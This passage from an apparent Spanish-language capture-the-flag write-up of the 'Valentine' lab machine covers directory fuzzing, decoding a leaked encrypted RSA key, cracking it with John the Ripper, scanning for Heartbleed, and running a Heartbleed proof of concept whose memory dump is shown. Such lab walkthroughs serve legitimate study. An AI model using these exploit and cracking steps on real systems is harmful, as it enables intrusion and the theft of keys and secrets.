+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -x php,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.79/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              php,txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.php            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 38<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/dev                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 308<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.79/dev/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/encode               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 554<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/encode.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 554<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/decode               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 552<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/decode.php           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 552<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/omg                  <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 153356<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 292<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">661676</span> / <span style="color:#ae81ff">661683</span> <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-u</em></td>
+					<td>Para indicar la URL a utilizar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-x</em></td>
+					<td>Para indicar la busqueda especifica de extensiones de archivos.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Nada más por probar, veamos que nos puede reportar <strong>nmap</strong> si le decimos que aplique <strong>Fuzzing</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script http-enum -p80 10.10.10.79 -oN webScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-21 12:12 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| http-enum: 
+</span></span><span style="display:flex;"><span>|   /dev/: Potentially interesting directory w/ listing on <span style="color:#e6db74">&#39;apache/2.2.22 (ubuntu)&#39;</span>
+</span></span><span style="display:flex;"><span>|_  /index/: Potentially interesting folder
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.19 seconds
+</span></span></code></pre></div><p>Vamos a analizar el directorio <strong>dev</strong> que encontró <strong>nmap, gobuster y wfuzz</strong>, esto porque puede ser de un desarrollador, a lo mejor puso algo ahí de utilidad.</p>
+<h3 id="Dirs">Enumerando Directorios Encontrados</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-valentine/Captura3.png">
+</p>
+<p>Ok, encontramos dos cosillas, veamos de que se trata, primero vamos a ver el archivo de texto:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-valentine/Captura4.png">
+</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Traducción</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Para hacer: <br> 1) Café. <br> 2) Investigar. <br> 3) Arreglar el decodificador/codificador antes de ponerlo en marcha. <br> 4) Asegurarse de que la codificación/decodificación sólo se realiza en el lado del cliente. <br> 5) No usar el decodificador/codificador hasta que todo esto esté hecho. <br> 6) Encontrar una forma mejor de tomar notas.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Esto es un mensaje de un desarrollador, menciona 2 páginas llamadas <strong>encoder y decoder</strong> que aparecieron en el <strong>Fuzzing</strong>.</p>
+<p>Ahora veamos el otro archivo:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-valentine/Captura5.png">
+</p>
+<p>Esto me suena a que es una llave pública o privada, está en hexadecimal, por lo que podemos descifrar que es.</p>
+<p>Bien, ya entramos en <strong>dev</strong>, veamos el de <strong>encode</strong>:</p>
+<p><img src="/assets/images/htb-writeup-valentine/Captura6.png" alt=""></p>
+<p>Ahora veamos la página <strong>decode</strong>:</p>
+<p><img src="/assets/images/htb-writeup-valentine/Captura7.png" alt=""></p>
+<p>Pues no nos sirve de mucho esto, me parece que <strong>encode</strong> transforma la data que le pongas en <strong>base64</strong> y el <strong>decode</strong> lo descifra.</p>
+<p>Con esto creo que ya revisamos todo.</p>
+<p>Veamos si podemos descifrar la llave en hexadecimal.</p>
+<h3 id="Llave">Descifrando Llave en Hexadecimal</h3>
+<p>Vamos a copiar todo eso en un archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano key
+</span></span></code></pre></div><p>Después de guardar y cerrar, vamos a utilizar el comando <strong>tr</strong> para eliminar los espacios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat key | tr -d <span style="color:#e6db74">&#39; &#39;</span>                                          
+</span></span><span style="display:flex;"><span>2d2d2d2d2d424547494e205253412050524956415445204b45592d2d2d2d2d0d0a50726f632d547970653a20...
+</span></span></code></pre></div><p>Y con el comando <strong>xxd</strong>, vamos a descifrar esta llave:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat key | tr -d <span style="color:#e6db74">&#39; &#39;</span> | xxd -ps -r
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>Proc-Type: 4,ENCRYPTED
+</span></span><span style="display:flex;"><span>DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+</span></span><span style="display:flex;"><span>5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
+</span></span><span style="display:flex;"><span>0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
+</span></span><span style="display:flex;"><span>Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
+</span></span><span style="display:flex;"><span>OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
+</span></span><span style="display:flex;"><span>pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
+</span></span><span style="display:flex;"><span>QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
+</span></span><span style="display:flex;"><span>p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>¡Listo! Pero nos menciona que está encriptada, vamos a tratar de desencriptarla.</p>
+<p>El siguiente blog, explica como hacerlo:</p>
+<ul>
+<li><a href="https://sniferl4bs.com/2020/07/password-cracking-101-john-the-ripper-password-cracking-ssh-keys/" target="_blank">Password Cracking 101: John The Ripper Password Cracking SSH Keys</a></li>
+</ul>
+<p>Pero, necesitamos la herramienta <strong>ssh2john</strong>, que la puedes encontrar aquí:</p>
+<ul>
+<li><a href="https://raw.githubusercontent.com/truongkma/ctf-tools/master/John/run/sshng2john.py" target="_blank">Repositorio de truongkma: ssh2john.py</a></li>
+</ul>
+<p>Vamos a copiar ese script con el comando <strong>wget</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
+</span></span><span style="display:flex;"><span>--2023-04-21 14:42:03--  https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
+</span></span><span style="display:flex;"><span>Resolviendo github.com <span style="color:#f92672">(</span>github.com<span style="color:#f92672">)</span>... 140.82.113.3
+</span></span><span style="display:flex;"><span>Conectando con github.com <span style="color:#f92672">(</span>github.com<span style="color:#f92672">)[</span>140.82.113.3<span style="color:#f92672">]</span>:443... conectado.
+</span></span><span style="display:flex;"><span>Petición HTTP enviada, esperando respuesta... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Longitud: no especificado <span style="color:#f92672">[</span>text/html<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Grabando a: «sshng2john.py»
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssh2john.py            100%<span style="color:#f92672">[=======================</span>&gt;<span style="color:#f92672">]</span>   9.45K  --.-KB/s    en 0.001s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2023-04-21 14:42:04 <span style="color:#f92672">(</span>1.61 MB/s<span style="color:#f92672">)</span> - «ssh2john.py» guardado <span style="color:#f92672">[</span>533071<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Puedes ver que ya se copió:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>heartbleed-PoC  sshng2john.py
+</span></span></code></pre></div><p>Ahora copiemos la llave privada en un archivo llamado <strong>id_rsa</strong> y dale los permisos para esta clase de llaves:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano id_rsa
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span></code></pre></div><p>Después de guardar y salir, usaremos la herramienta que descargamos junto con el archivo <strong>id_rsa</strong> para convertir esta llave en un hash que la herramienta <strong>john</strong> pueda descifrar.</p>
+<p>Hagámoslo entonces:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 sshng2john.py id_rsa &gt; hash
+</span></span></code></pre></div><p>Y al fin, descifremos el <strong>hash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>0g 0:00:00:11 DONE <span style="color:#f92672">(</span>2023-04-21 15:03<span style="color:#f92672">)</span> 0g/s 1262Kp/s 1262Kc/s 1262KC/s *7¡Vamos!
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Fue un intento fallido para descifrar la llave.</p>
+<p>Y ya, pues, no encuentro otra forma de vulnerar la página, así que vamos a ver si <strong>nmap</strong> nos puede decir si un puerto tienen alguna vulnerabilidad.</p>
+<h3 id="NMAP">Buscando Vulnerabilidades Web con NMAP</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script <span style="color:#e6db74">&#34;vuln and safe&#34;</span> -p443 10.10.10.79 -oN newWebScan
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-21 13:10 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.79
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>443/tcp open  https
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssl-ccs-injection: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   SSL/TLS MITM vulnerability <span style="color:#f92672">(</span>CCS Injection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     Risk factor: High
+</span></span><span style="display:flex;"><span>|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
+</span></span><span style="display:flex;"><span>|       does not properly restrict processing of ChangeCipherSpec messages,
+</span></span><span style="display:flex;"><span>|       which allows man-in-the-middle attackers to trigger use of a zero
+</span></span><span style="display:flex;"><span>|       length master key in certain OpenSSL-to-OpenSSL communications, and
+</span></span><span style="display:flex;"><span>|       consequently hijack sessions or obtain sensitive information, via
+</span></span><span style="display:flex;"><span>|       a crafted TLS handshake, aka the <span style="color:#e6db74">&#34;CCS Injection&#34;</span> vulnerability.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       http://www.cvedetails.com/cve/2014-0224
+</span></span><span style="display:flex;"><span>|       http://www.openssl.org/news/secadv_20140605.txt
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2014-0224
+</span></span><span style="display:flex;"><span>| ssl-heartbleed: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows <span style="color:#66d9ef">for</span> stealing information intended to be protected by SSL/TLS encryption.
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     Risk factor: High
+</span></span><span style="display:flex;"><span>|       OpenSSL versions 1.0.1 and 1.0.2-beta releases <span style="color:#f92672">(</span>including 1.0.1f and 1.0.2-beta1<span style="color:#f92672">)</span> of OpenSSL are affected by the Heartbleed bug. The bug allows <span style="color:#66d9ef">for</span> reading memory of systems protected by the vulnerable OpenSSL versions and could allow <span style="color:#66d9ef">for</span> disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
+</span></span><span style="display:flex;"><span>|           
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       http://cvedetails.com/cve/2014-0160/
+</span></span><span style="display:flex;"><span>|       http://www.openssl.org/news/secadv_20140407.txt 
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2014-0160
+</span></span><span style="display:flex;"><span>|_http-vuln-cve2017-1001000: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-poodle: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   SSL POODLE information leak
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2014-3566  BID:70574
+</span></span><span style="display:flex;"><span>|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+</span></span><span style="display:flex;"><span>|           products, uses nondeterministic CBC padding, which makes it easier
+</span></span><span style="display:flex;"><span>|           <span style="color:#66d9ef">for</span> man-in-the-middle attackers to obtain cleartext data via a
+</span></span><span style="display:flex;"><span>|           padding-oracle attack, aka the <span style="color:#e6db74">&#34;POODLE&#34;</span> issue.
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2014-10-14
+</span></span><span style="display:flex;"><span>|     Check results:
+</span></span><span style="display:flex;"><span>|       TLS_RSA_WITH_AES_128_CBC_SHA
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       https://www.securityfocus.com/bid/70574
+</span></span><span style="display:flex;"><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2014-3566
+</span></span><span style="display:flex;"><span>|       https://www.imperialviolet.org/2014/10/14/poodle.html
+</span></span><span style="display:flex;"><span>|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 24.55 seconds
+</span></span></code></pre></div><p><strong>NOTA</strong>: Utilice el puerto 443 porque no funciono con el puerto 80.</p>
+<p>Muy bien, el único Exploit vulnerable que veo es el de <strong>Heartbleed</strong>, pero no sé dé que se trate, vamos a investigarlo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Ataque Heartbleed</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Heartbleed es un agujero de seguridad de software en la biblioteca de código abierto OpenSSL, solo vulnerable en su versión 1.0.1f, que permite a un atacante leer la memoria de un servidor o un cliente, permitiéndole por ejemplo, conseguir las claves privadas SSL de un servidor.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Vamos a usar este Exploit, pero me llama la atención que en las imágenes aparece un corazón similar al de la página index:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-valentine/Captura9.png">
+</p>
+<p>¿Nos estaban dando una pista desde el principio?</p>
+<p>Entonces vamos a buscar un Exploit.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Exploit">Buscando el Exploit Heartbleed</h3>
+<p>Mira encontré este:</p>
+<ul>
+<li><a href="https://github.com/mpgn/heartbleed-PoC" target="_blank">Repositorio de mpgn: Heartbleed PoC</a></li>
+</ul>
+<p>Por lo que entiendo, el Exploit tratara de extraer información almacenada en la memoria del servidor de la máquina y lo guardara en un archivo llamado <strong>out.txt</strong>.</p>
+<p>Vamos a clonarlo y a probarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/mpgn/heartbleed-PoC.git            
+</span></span><span style="display:flex;"><span>Clonando en <span style="color:#e6db74">&#39;heartbleed-PoC&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 19, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">19</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>delta 0<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">19</span>
+</span></span><span style="display:flex;"><span>Recibiendo objetos: 100% <span style="color:#f92672">(</span>19/19<span style="color:#f92672">)</span>, 5.79 KiB | 456.00 KiB/s, listo.
+</span></span><span style="display:flex;"><span>Resolviendo deltas: 100% <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>, listo.
+</span></span></code></pre></div><p>Nos metemos al directorio que se creó y vamos a probar el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 heartbleed-exploit.py 10.10.10.79                                                                                  
+</span></span><span style="display:flex;"><span>Connecting...
+</span></span><span style="display:flex;"><span>Sending Client Hello...
+</span></span><span style="display:flex;"><span> ... received message: type <span style="color:#f92672">=</span> 22, ver <span style="color:#f92672">=</span> 0302, length <span style="color:#f92672">=</span> <span style="color:#ae81ff">66</span>
+</span></span><span style="display:flex;"><span> ... received message: type <span style="color:#f92672">=</span> 22, ver <span style="color:#f92672">=</span> 0302, length <span style="color:#f92672">=</span> <span style="color:#ae81ff">885</span>
+</span></span><span style="display:flex;"><span> ... received message: type <span style="color:#f92672">=</span> 22, ver <span style="color:#f92672">=</span> 0302, length <span style="color:#f92672">=</span> <span style="color:#ae81ff">331</span>
+</span></span><span style="display:flex;"><span> ... received message: type <span style="color:#f92672">=</span> 22, ver <span style="color:#f92672">=</span> 0302, length <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Handshake <span style="color:#66d9ef">done</span>...
+</span></span><span style="display:flex;"><span>Sending heartbeat request with length <span style="color:#ae81ff">4</span> :
+</span></span><span style="display:flex;"><span> ... received message: type <span style="color:#f92672">=</span> 24, ver <span style="color:#f92672">=</span> 0302, length <span style="color:#f92672">=</span> <span style="color:#ae81ff">16384</span>
+</span></span><span style="display:flex;"><span>Received heartbeat response in file out.txt
+</span></span><span style="display:flex;"><span>WARNING : server returned more data than it should - server is vulnerable!
+</span></span></code></pre></div><p>Saco algo, puedes ver que se creó un archivo llamado <strong>out.txt</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>heartbleed-exploit.py  out.txt  README.md  utils
+</span></span></code></pre></div><p><strong>OJO:</strong> utilice el comando <strong>grep</strong> para eliminar parte del output que se repitió mucho, aquí tienes una página que muestra lo útil del comando <strong>grep</strong>:</p>
+<ul>
+<li><a href="https://geekland.eu/uso-del-comando-grep-en-linux-y-unix-con-ejemplos/" target="_blank">Uso del comando grep en Linux y UNIX con ejemplos</a></li>
+</ul>
+<p>Ahora sí, veamos el contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat out.txt | grep -v <span style="color:#e6db74">&#39;00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&#39;</span>
+</span></span><span style="display:flex;"><span>  0000: <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">00</span> D8 <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">02</span> <span style="color:#ae81ff">53</span> <span style="color:#ae81ff">43</span> 5B <span style="color:#ae81ff">90</span> 9D 9B <span style="color:#ae81ff">72</span> 0B BC 0C  .@....SC<span style="color:#f92672">[</span>...r...
+</span></span><span style="display:flex;"><span>  0010: BC 2B <span style="color:#ae81ff">92</span> A8 <span style="color:#ae81ff">48</span> <span style="color:#ae81ff">97</span> CF BD <span style="color:#ae81ff">39</span> <span style="color:#ae81ff">04</span> CC <span style="color:#ae81ff">16</span> 0A <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">90</span>  .+..H...9.......
+</span></span><span style="display:flex;"><span>  0020: 9F <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">33</span> D4 DE <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">66</span> C0 <span style="color:#ae81ff">14</span> C0 0A C0 <span style="color:#ae81ff">22</span> C0  .w.3....f.....<span style="color:#e6db74">&#34;.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
